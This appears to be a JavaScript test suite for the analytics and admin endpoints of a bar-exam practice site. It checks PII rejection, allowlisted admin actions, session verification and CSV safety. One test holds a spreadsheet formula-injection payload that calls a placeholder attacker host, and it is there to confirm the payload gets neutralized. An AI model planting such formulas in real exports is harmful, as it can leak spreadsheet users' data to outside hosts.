import assert from 'node:assert/strict';
import test from 'node:test';
import {
  AnalyticsValidationError,
  analyticsRpcPayload,
  normalizeAnalyticsEvent,
} from './analytics-core.mjs';
import {
  AdminValidationError,
  aggregateCsv,
  normalizeAdminAction,
  normalizeDashboardRequest,
  normalizeOperationalRequest,
  safeCsvCell,
} from './admin-core.mjs';
import worker from './index.mjs';

const analyticsEvent = {
  sessionId: '10000000-0000-4000-8000-000000000001',
  visitorId: '20000000-0000-4000-8000-000000000001',
  eventKey: 'phase3eventkey000001',
  eventType: 'grading_success',
  subject: 'Labor Law',
  questionId: 'LAB-001',
  pageArea: 'mock_bar',
  resultCategory: 'tier_4',
  durationMs: 420000,
  latencyMs: 1250,
  modelName: 'gemini-test',
  workerVersion: 'phase3-test',
  score: 4.2,
  deviceCategory: 'desktop',
  metadata: { bankAuthority: 'server' },
};

test('analytics accepts privacy-safe one-decimal grading telemetry', () => {
  const normalized = normalizeAnalyticsEvent(analyticsEvent);
  assert.equal(normalized.score, 4.2);
  assert.equal(normalized.questionId, 'LAB-001');
  assert.equal(analyticsRpcPayload(normalized, null).p_score, 4.2);
});

test('analytics rejects nested answers, prompts, emails, IPs, and tokens', () => {
  for (const key of ['answer_text', 'prompt', 'email', 'raw_ip', 'token', 'user_agent']) {
    assert.throws(
      () => normalizeAnalyticsEvent({
        ...analyticsEvent,
        eventKey: `phase3${key.replace(/_/g, '')}000000`,
        metadata: { nested: { [key]: 'forbidden' } },
      }),
      AnalyticsValidationError,
    );
  }
});

test('analytics rejects unknown events and score precision beyond one decimal', () => {
  assert.throws(() => normalizeAnalyticsEvent({
    ...analyticsEvent,
    eventType: 'mouse_movement',
  }), AnalyticsValidationError);
  assert.throws(() => normalizeAnalyticsEvent({
    ...analyticsEvent,
    score: 4.25,
  }), AnalyticsValidationError);
});

test('dashboard windows are bounded and comparison-required', () => {
  const request = normalizeDashboardRequest({
    from: '2026-07-01T00:00:00Z',
    to: '2026-07-31T00:00:00Z',
    previousFrom: '2026-06-01T00:00:00Z',
    previousTo: '2026-07-01T00:00:00Z',
  });
  assert.equal(request.from, '2026-07-01T00:00:00.000Z');
  assert.throws(() => normalizeDashboardRequest({
    from: '2025-01-01', to: '2026-07-31',
    previousFrom: '2024-01-01', previousTo: '2025-01-01',
  }), AdminValidationError);
});

test('operational sections and administrator actions are allowlisted', () => {
  assert.equal(normalizeOperationalRequest({ section: 'support' }).section, 'support');
  assert.throws(() => normalizeOperationalRequest({ section: 'raw_sql' }), AdminValidationError);
  const action = normalizeAdminAction({
    action: 'support_update',
    targetId: '30000000-0000-4000-8000-000000000001',
    payload: { status: 'resolved' },
    reason: 'Resolved after review',
    requestKey: 'phase3requestkey0001',
  });
  assert.equal(action.action, 'support_update');
  assert.throws(() => normalizeAdminAction({
    ...action,
    action: 'disable_grading',
  }), AdminValidationError);
});

test('aggregate CSV neutralizes spreadsheet formulas and excludes PII fields', () => {
  assert.equal(safeCsvCell('=IMPORTXML("https://evil.invalid")').startsWith("\"'="), true);
  const csv = aggregateCsv({
    meta: { data_collection_start: null, freshness: 'No verified analytics events yet' },
    realtime: { current_viewers: 0 },
    current: {
      traffic: { page_views: 0, unique_visitors: 0, sessions: 0 },
      funnel: { registrations: 0 },
      learning: { successful_grades: 0 },
      reliability: { success_rate: null },
    },
    previous: { traffic: {}, funnel: {}, learning: {} },
  });
  assert.match(csv, /Paid subscribers.*Not connected/);
  assert.doesNotMatch(csv, /email|answer_text|student_answer|raw_ip|token/i);
});

const workerEnv = {
  ALLOWED_ORIGIN: 'https://duediligence.ph',
  SUPABASE_URL: 'https://phase3-test.supabase.co',
  SUPABASE_SERVICE_ROLE_KEY: 'synthetic-service-role',
  GUEST_USAGE_HMAC_KEY: 'synthetic-hmac',
};

test('trusted analytics endpoint validates and stores only normalized fields', async () => {
  const originalFetch = globalThis.fetch;
  let rpcBody;
  globalThis.fetch = async (input, init) => {
    const url = String(input);
    assert.match(url, /\/rest\/v1\/rpc\/record_usage_event$/);
    rpcBody = JSON.parse(init.body);
    return Response.json({ accepted: true, event_stored: true });
  };
  try {
    const response = await worker.fetch(new Request('https://worker.example/analytics/events', {
      method: 'POST',
      headers: { Origin: 'https://duediligence.ph', 'Content-Type': 'application/json' },
      body: JSON.stringify(analyticsEvent),
    }), workerEnv);
    assert.equal(response.status, 202);
    assert.equal(rpcBody.p_question_id, 'LAB-001');
    assert.equal(rpcBody.p_score, 4.2);
    assert.equal(JSON.stringify(rpcBody).includes('studentAnswer'), false);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test('administrator endpoint rejects missing sessions before database access', async () => {
  const response = await worker.fetch(new Request('https://worker.example/admin/session', {
    method: 'POST',
    headers: { Origin: 'https://duediligence.ph', 'Content-Type': 'application/json' },
    body: '{}',
  }), workerEnv);
  assert.equal(response.status, 401);
  const body = await response.json();
  assert.equal(body.error.code, 'ADMIN_SIGN_IN_REQUIRED');
});

test('administrator session is verified by Supabase before aggregate RPC', async () => {
  const originalFetch = globalThis.fetch;
  let rpcCalled = false;
  globalThis.fetch = async (input) => {
    const url = String(input);
    if (url.endsWith('/auth/v1/user')) {
      return Response.json({ id: '91000000-0000-4000-8000-000000000001' });
    }
    if (url.endsWith('/rest/v1/rpc/admin_authorization_context')) {
      rpcCalled = true;
      return Response.json({
        authorized: true,
        role: 'super_admin',
        capabilities: ['analytics_viewer'],
      });
    }
    throw new Error(`Unexpected fetch: ${url}`);
  };
  try {
    const response = await worker.fetch(new Request('https://worker.example/admin/session', {
      method: 'POST',
      headers: {
        Origin: 'https://duediligence.ph',
        'Content-Type': 'application/json',
        Authorization: 'Bearer synthetic-user-token',
      },
      body: '{}',
    }), workerEnv);
    assert.equal(response.status, 200);
    assert.equal(rpcCalled, true);
    assert.equal((await response.json()).role, 'super_admin');
  } finally {
    globalThis.fetch = originalFetch;
  }
});
